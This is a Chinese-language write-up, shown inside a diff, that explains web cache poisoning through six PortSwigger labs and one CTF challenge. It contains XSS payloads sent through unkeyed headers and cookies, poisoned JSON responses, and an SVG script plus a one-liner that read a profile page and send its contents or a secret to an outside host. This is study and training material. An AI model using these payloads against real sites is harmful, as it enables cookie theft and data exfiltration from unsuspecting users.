@@ -1,0 +1,257 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p><strong>引言：</strong></p>
+<p>缓存投毒，听起来就是寻找和利用都很困难的一类漏洞利用。但在了解了原理以及实际体验过之后，你会发现，过程很神奇，结果很美好~ 这篇文章算是对缓存投毒的一个小总结，以便后面的复习。内容浅尝即止，师傅们轻喷。</p>
+<p>文章一共分为以下几个部分：</p>
+<ol>
+<li>什么是缓存投毒？</li>
+<li>缓存投毒的发现与利用</li>
+<li>通过几个实验例子来实践缓存投毒</li>
+<li>使用缓存投毒来解CTF题</li>
+</ol>
+<h2 data-content="1" id="a4b23264629c54c37de5d5196e421cb2">一、什么是缓存投毒？</h2>
+<ul>
+<li>什么是Web缓存：</li>
+</ul>
+<p>缓存位于服务器和用户之间，通常在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户在这段时间内发送了同样的请求，则缓存会直接提供响应的副本(缓存)给用户，而无需与服务器直接进行交互。通过减少服务器对重复请求进行处理的次数，来减轻服务器的负担。使用CDN(内容分发网络)就可以达到这样的目的。关于CDN与缓存之间的理解，参考：<a href="https://www.cnblogs.com/shamo89/p/9234705.html" target="_blank">CDN与缓存的归纳理解</a></p>
+<p>如下图就是同时间的用户访问同一个内容时，获取资源的过程。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115852-68b8ac64-883b-1.png"/></p>
+<p>那CDN怎么知道用户要访问的是同一个页面呢？(实际上除了CDN还有其他的缓存技术，这里以CDN为例，其他的暂不了解)</p>
+<p>当缓存接收到HTTP请求的时候，它会匹配vary头部指定的HTTP HEADER来进行判断。当指定的头部与缓存中的数据匹配时，则提供缓存的内容。如果不匹配，就直接与服务器交互。这些指定的头部被称作：缓存键 “cache key”。其他的头部就是非缓存键。</p>
+<p>参考：<a href="https://blog.csdn.net/qq_29405933/article/details/84315254" target="_blank">HTTP请求的响应头部Vary的理解</a></p>
+<ul>
+<li>缓存投毒的原理</li>
+</ul>
+<p>在web缓存部分我们知道，当一个页面的内容被缓存后，其他用户访问这个页面时会接收到同样的内容。如果在缓存的过程中，存入了有害的内容，比如存入了一个带有XSS payload的页面。其他用户访问时，就会受到XSS漏洞的攻击。这就是缓存投毒。</p>
+<p>那什么情况下可以在缓存中写入一个带有XSS的页面呢？或者说其它对用户有害的内容？</p>
+<h2 data-content="1" id="dbe8ceefad94052859ebaaad17ac8172">二、缓存投毒的发现与利用</h2>
+<p>这个部分的内容，在参考的文章当中已经有比较完整的步骤描述。大致可以分为以下几个步骤：</p>
+<ol>
+<li>
+<p>判断哪些非缓存键会影响页面内容</p>
+<p>任何的缓存投毒都依赖于非缓存键，所以我们在一开始就要判断哪些HTTP头部属于缓存键，哪些不属于。再通过修改或添加HTTP头部来判断哪些头部会引起页面内容的变化。常用的两种方式：</p>
+<ol>
+<li>手动修改或添加HTTP头部，指定随机字符来判断头部是否影响页面内容</li>
+<li>使用Brupsuite插件<a href="https://github.com/portswigger/param-miner" target="_blank">Param Miner</a>来自动判断</li>
+</ol>
+</li>
+<li>
+<p>构造内容引起服务器端的有害响应</p>
+<p>针对不同的非缓存键，我们需要知道哪些非缓存键会导致页面返回有害的内容。举一个例子：页面中js链接的域名是通过获取HTTP头部中的“X-Forwarded-Host”字段来设置的。而服务器不会将这个字段作为缓存键，那么这个字段就可以利用。</p>
+</li>
+<li>
+<p>获取响应，使有害内容被缓存</p>
+<p>通过构造有害的内容，访问页面，获取响应。就会将有害的内容存入缓存中。需要注意的是，页面是否会被缓存受到文件扩展名、内容类型、url路由、状态代码和响应标头的影响。在测试的会比较麻烦。</p>
+</li>
+</ol>
+<p>看完上面这几个步骤，应该对投毒的过程有了一个大概的了解。现在我们通过几个实验例子来学习具体的缓存利用方式。这里的实验环境为Brupsuite社区的缓存投毒实验案例。目的都是通过缓存投毒来导致XSS漏洞。</p>
+<p>地址：<a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank">Web cache poisoning</a></p>
+<h2 data-content="1" id="6159a26727d69848608311578bbed178">三、通过几个实验例子来实践缓存投毒</h2>
+<p>以下的几个实验过程中，构造了Payload并发送请求之后，都需要等待一段时间才能够解决题目。因为题目后端每分钟会对实验主页进行访问，这时你投毒的缓存才能被后端加载。</p>
+<h3 data-content="1" id="fd98b1a41f6348f6577ac4cf1e545e19">1、缓存投毒之资源的危险导入</h3>
+<p>某些网站会使用非缓存键动态生成页面中的url地址，比如说使用HTTP头部中的“X-Forwarded-Host”字段来设置外部托管的Javascript文件的域名(host)。我们可以通过寻找和利用这样的字段来进行缓存投毒。</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-header" target="_blank">Lab: Web cache poisoning with an unkeyed header</a></p>
+<p>题目目标：插入XSS payload并弹出cookie。即：<code>alert(document.cookie)</code></p>
+<p>Hint：这个实验使用了<code>X-Forwarded-Host</code>头部</p>
+<p>这题比较简单，通过Brupsuite添加一个X-Forwarded-Host，构造一个XSS Payload即可投毒。</p>
+<p><code>X-Forwarded-Host: baidu.com"&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115906-70ac8508-883b-1.png"/></p>
+<h3 data-content="1" id="7fa898e5473988c1e27fb5732390d86f">2、缓存投毒之Cookie导致的XSS</h3>
+<p>当Cookie中的内容回显到页面上并导致XSS，而Cookie字段不属于缓存键时。就可以构造payload进行缓存投毒。</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-cookie" target="_blank">Lab: Web cache poisoning with an unkeyed cookie</a></p>
+<p>题目目标：插入XSS payload并弹出1。即<code>alert(1)</code></p>
+<p>页面中会回显cookie的值到js代码中，构造payload即可弹出1：</p>
+<p><code>fehost=prod-cache-01"}%3Balert(1)%3Babc={"":"</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115915-75e23e82-883b-1.png"/></p>
+<h3 data-content="1" id="c1668d6dc92b30df1b957971bbd98392">3、多个Header导致的缓存投毒</h3>
+<p>上面两个实验都是一个Header中的内容导致的问题。但实际情况会有多个Header配合来进行利用。</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-multiple-headers" target="_blank">Lab: Web cache poisoning with multiple headers</a></p>
+<p>题目目标：插入XSS payload并弹出cookie。即：<code>alert(document.cookie)</code></p>
+<p>Hint：环境使用了 <code>X-Forwarded-Host</code> 和 <code>X-Forwarded-Scheme</code> 头部。</p>
+<p>通过测试可以发现，如果指定了<code>X-Forwarded-Scheme</code>头部内容不为https。则页面会进行302跳转到<code>https://</code> + <code>X-Forwarded-Host</code> 所指定的地址中去。</p>
+<p>解决这道题目不能直接对主页进行投毒，而是要对页面中加载的外部js进行投毒。这个环境也给我们提供了一个测试服务，可以在那个页面构造payload进行调用。</p>
+<ul>
+<li>构造外部js paylaod：</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115922-7a9fa0a4-883b-1.png"/></p>
+<ul>
+<li>对外部js进行投毒</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">Host</span><span class="p">:</span> <span class="n">ac5c1f171eef4cb380f31bdb01c7000c</span><span class="o">.</span><span class="n">web</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">academy</span><span class="o">.</span><span class="n">net</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">Scheme</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115930-7f091422-883b-1.png"/></p>
+<h3 data-content="1" id="c93be79484f8201899768b3cfc26887a">4、缓存投毒之内容不唯一的缓存键</h3>
+<p>当服务器通过vary指定内容不唯一的缓存键时，我们需要先通过一些其他的方式先获取到缓存键，再通过指定这个缓存键的内容来进行投毒。来看实验例子：</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-targeted-using-an-unknown-header" target="_blank">Lab: Targeted web cache poisoning using an unknown header</a></p>
+<p>题目目标：插入XSS payload并弹出cookie。即：<code>alert(document.cookie)</code></p>
+<p>这题没有Hint，需要自己去寻找一个特殊的非缓存键。通过使用<a href="https://github.com/portswigger/param-miner" target="_blank">Param Miner</a>工具，寻找到了一个<code>X-Host</code>字段，可以指定页面的js的域名(host)。(这个点卡了我好久，那个工具扫字段特别慢，我一度以为没有这样的字段。)</p>
+<p>在服务器返回的头部中可知，vary字段指定了User-Agent为缓存键，如果我们要给目标用户投毒的话，就必须先知道他的User-Agent。题目中有说明：用户分钟会看主页和文章页面。我们可以通过评论一个图片，将图片中的链接改为收集Header的地址。这样就可以收集到目标用户的Header，再通过指定Header进行投毒。</p>
+<ul>
+<li>文章评论中置入图片收集User-Agent</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115938-84280a4e-883b-1.png"/></p>
+<p>收集到的User-Agent：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115948-89cce08c-883b-1.png"/></p>
+<ul>
+<li>对主页进行投毒</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115956-8e67a49c-883b-1.png"/></p>
+<h3 data-content="1" id="3ed505cbe9e4665002123c96b759ef4b">5、缓存投毒之DOM型的漏洞(DOM-XSS)</h3>
+<p>很多网站会通过JS从后端来获取和处理其他数据，如果没有对来自服务器的数据进行严格校验的话，可能会导致基于DOM的漏洞。比如说DOM型的XSS。</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria" target="_blank">Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria</a></p>
+<p>题目目标：插入XSS payload并弹出cookie。即：<code>alert(document.cookie)</code></p>
+<p>首先需要通过<a href="https://github.com/portswigger/param-miner" target="_blank">Param Miner</a>工具寻找一个可利用的字段。页面通过<code>X-Forwarded-Host</code>字段来设置data数据中的host字段。这个地段在之后用作json数据的来源的地址。</p>
+<p>页面通过这样一段js来获取用户的地区。并且会将json中的数据通过DOM操作的方式写入到页面上。</p>
+<pre><code>&lt;script&gt;
+    initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
+&lt;/script&gt;</code></pre>
+<p>处理json的js：</p>
+<pre><code>function initGeoLocate(jsonUrl)
+{
+    fetch(jsonUrl)
+        .then(r =&gt; r.json())
+        .then(j =&gt; {
+            let geoLocateContent = document.getElementById('shipping-info');
+
+            let img = document.createElement("img");
+            img.setAttribute("src", "/resources/images/localShipping.svg");
+            geoLocateContent.appendChild(img)
+
+            let div = document.createElement("div");
+            div.innerHTML = 'Free shipping to ' + j.country;
+            geoLocateContent.appendChild(div)
+        });
+}</code></pre>
+<p>默认的json数据：</p>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">"country"</span><span class="p">:</span> <span class="s2">"United Kingdom"</span>
+<span class="p">}</span>
+</pre></div>
+<p>我们可以通过构造<code>X-Forwarded-Host</code>字段来对data.host进行投毒。将js获取的json数据地址指定为我们的恶意地址。恶意内容写入到页面中造成XSS。</p>
+<ul>
+<li>构造Pyload</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">"country"</span><span class="p">:</span> <span class="s2">"&lt;svg onload=alert(document.cookie)&gt;"</span>
+<span class="p">}</span>
+</pre></div>
+<p>需要注意的是，恶意服务器上需要设置CORS，不然js获取不了非同源的数据。</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *</code></pre>
+<ul>
+<li>访问页面进行投毒</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427120007-95108930-883b-1.png"/></p>
+<h3 data-content="1" id="a3eb04e1ea8a97623f25c209426c1b3c">6、多个缓存投毒之间的配合</h3>
+<p>通过前面5个实验，我们了解到了不同方式的缓存投毒。但有些时候需要我们将多个不同方式的缓存投毒联系起来，互相配合。才能够有效的利用漏洞。</p>
+<p>题目地址：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-combining-vulnerabilities" target="_blank">Lab: Combining web cache poisoning vulnerabilities</a></p>
+<p>题目目标：插入XSS payload并弹出cookie。即：<code>alert(document.cookie)</code></p>
+<p>题目描述：某用户每分钟会通过自己的语言转换给English。</p>
+<p>题目简要情况：</p>
+<ol>
+<li>用户可以选择指定语言切换页面的语言</li>
+<li>语言来自页面中js从后端读取的json数据</li>
+<li>选择了语言后会访问/setlang/es接口，设置cookie。</li>
+<li>主页中的js通过获取cookie中的值与json的值动态设置页面语言</li>
+</ol>
+<p>题目里面的各个重要的点：</p>
+<ol>
+<li>通过<a href="https://github.com/portswigger/param-miner" target="_blank">Param Miner</a>工具可以发现两个可利用的字段。<code>X-Forwarded-Host</code>可以指定页面中data.host，后面用作json数据的域名。<code>X-Original-URL</code>可以使页面跳转到同域名的指定的url中去。</li>
+<li>通过对js处理逻辑的分析，json中的en字段不能插入payload。其他语言可以通过设置"View details"来插入Payload。</li>
+<li>两个比较重要的地址：<ul>
+<li>/setlang/es 设置语言，返回SetCookie头。</li>
+<li>/?localized=1 设置完语言后所跳转的地址。</li>
+</ul>
+</li>
+</ol>
+<p>解题思路：</p>
+<p>第一处投毒：</p>
+<ol>
+<li>由于英文(en)不能设置payload，所以我们只能通过设置<code>X-Original-URL</code>强行让用户设置为其他类型的语言。</li>
+<li>通过设置一种语言中的xsspayload，让用户强行跳转过来</li>
+</ol>
+<p>第二处投毒：</p>
+<ol>
+<li>json数据页面的投毒，让用户读取到恶意的带有xss payload的数据。</li>
+</ol>
+<p>解题：</p>
+<ul>
+<li>投毒主页让用户强行跳转到cn语言中</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427120016-9a48fae0-883b-1.png"/></p>
+<p>这里有个Trick就是<code>X-Original-URL</code>字段要设置为<code>/setlang\cn</code>，而不是<code>/setlang/cn</code>。这是因为后者跳转过去会有<code>Set-Cookie</code>字段，导致页面无法缓存。前者浏览器要先经过一个处理——将<code>\</code>转换为<code>/</code>。就不会有<code>Set-Cookie</code>字段了</p>
+<ul>
+<li>投毒/?localized=1 页面让用户读取到恶意数据</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427120023-9ebfd792-883b-1.png"/></p>
+<p>恶意数据的Header：</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *</code></pre>
+<p>恶意json数据：</p>
+<pre><code>{
+    "en": {
+    "name": "English"
+    },
+    "cn": {
+        "name": "a",
+        "translations": {
+            "Return to list": "123",
+            "View details": "&lt;svg onload=alert(document.cookie)&gt;",
+            "Description:": "456"
+        }
+    }
+}</code></pre>
+<p>可以使用Brupsuite持续的向这两个页面发送数据进行投毒，不然的话后端可能会访问不到。</p>
+<h2 data-content="1" id="3d3ffc2cc970d7ab8001d69497167bad">四、使用缓存投毒来解CTF题</h2>
+<p>打算整理缓存投毒是因为这篇文章：<a href="https://xz.aliyun.com/t/4492" target="_blank">通过一道题了解缓存投毒和SVG XSS</a> 这个CTF题也是文章里面的内容。我这里只记录一下简要的解题过程。</p>
+<p>题目地址：<a href="http://web50.zajebistyc.tf/" target="_blank">http://web50.zajebistyc.tf/</a></p>
+<h3 data-content="1" id="5448a3ac399b8c1578bd8bfa21b0297a">正常解题</h3>
+<p>构造SVG XSS Payload上传到服务器，将图片地址发送给管理员即可获得Flag。(<a href="http://***/是自己的vps地址" target="_blank">http://***/是自己的vps地址</a>)</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span>
+<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">version</span><span class="o">=</span><span class="s">"1.1"</span> <span class="na">id</span><span class="o">=</span><span class="s">"Layer_1"</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">x</span><span class="o">=</span><span class="s">"0px"</span> <span class="na">y</span><span class="o">=</span><span class="s">"0px"</span> <span class="na">width</span><span class="o">=</span><span class="s">"100px"</span> <span class="na">height</span><span class="o">=</span><span class="s">"100px"</span> <span class="na">viewBox</span><span class="o">=</span><span class="s">"0 0 751 751"</span> <span class="na">enable-background</span><span class="o">=</span><span class="s">"new 0 0 751 751"</span> <span class="na">xml:space</span><span class="o">=</span><span class="s">"preserve"</span><span class="p">&gt;</span>  <span class="p">&lt;</span><span class="nt">image</span> <span class="na">id</span><span class="o">=</span><span class="s">"image0"</span> <span class="na">width</span><span class="o">=</span><span class="s">"751"</span> <span class="na">height</span><span class="o">=</span><span class="s">"751"</span> <span class="na">x</span><span class="o">=</span><span class="s">"0"</span> <span class="na">y</span><span class="o">=</span><span class="s">"0"</span>
+    <span class="na">href</span><span class="o">=</span><span class="s">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s2">"/profile"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">e</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">f</span><span class="p">));</span>
+                <span class="nx">fetch</span><span class="p">(</span><span class="s2">"http://***/?"</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">f</span><span class="p">))</span>
+            <span class="p">})</span>
+    <span class="p">})</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427120034-a5741508-883b-1.png"/></p>
+<p>更简短的payload，通过正则匹配源码中的secret：</p>
+<pre><code>fetch("/profile").then(function(e){e.text().then(function(f){new/**/Image().src='//avlidienbrunn.se/?'+/secret(.*)&gt;/.exec(f)[0]})})</code></pre>
+<h3 data-content="1" id="e2d80fc7cc9bf5614a370e5dfc4a6094">缓存投毒方式</h3>
+<p>这种方式比前面的要复杂，能够这样解题的原因有以下几点：</p>
+<ol>
+<li>题目使用了cloudflare来作CDN缓存，会对js、img这类静态文件进行缓存</li>
+<li>题目运行你设置任意的文件名，且个人信息页面为名称结尾。例如，我将文件名设置为Smi1e.js，则个人信息页面就是/profile/Smi1e.js。CDN会将其缓存</li>
+<li>个人信息页面的鞋码处存在XSS</li>
+</ol>
+<p>通过这几点就很容易构造出缓存投毒的payload，但是之前在缓存部分我们知道，缓存受到地区的限制，不同地区不会访问到同一个缓存。在构造和利用这个缓存投毒时，我们需要购买一个与题目环境相对应的服务器进行利用。这里就直接看下别人的exp吧：<a href="https://ctftime.org/writeup/13925" target="_blank">https://ctftime.org/writeup/13925</a></p>
+<p>整个exp利用的步骤如下：</p>
+<ol>
+<li>页面上的 shoesize处存在xss，构造一个利用的数据包。</li>
+<li>注册一个以.js的用户名</li>
+<li>发送构造的数据包</li>
+<li>访问/profile/name.js页面</li>
+<li>report地址</li>
+</ol>
+<p>需要注意的是在这个题目环境当中，vary字段中的Cookie并没有生效。原因：</p>
+<p><em>理论上来说，网站可以使用“Vary”响应头来指定额外应该加入到缓存键中的其他请求头。在实践中，对Vary响应头的使用仅停留在理论阶段，像Cloudflare这样的CDN完全忽略它，大家甚至没有意识到他们的应用程序支持任何基于请求头的输入。<br/>
+——<a href="https://www.anquanke.com/post/id/156356" target="_blank">https://www.anquanke.com/post/id/156356</a></em></p>
+<h2 data-content="1" id="ba55303a11fff85f6f84b234ce258959">参考</h2>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/156356" target="_blank">实战Web缓存投毒（上）</a></li>
+<li><a href="https://www.anquanke.com/post/id/156551" target="_blank">实战Web缓存投毒（下）</a></li>
+<li><a href="https://xz.aliyun.com/t/4492" target="_blank">通过一道题了解缓存投毒和SVG XSS</a></li>
+<li><a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank">Web cache poisoning</a></li>
+</ul>
+</div>
+</div>
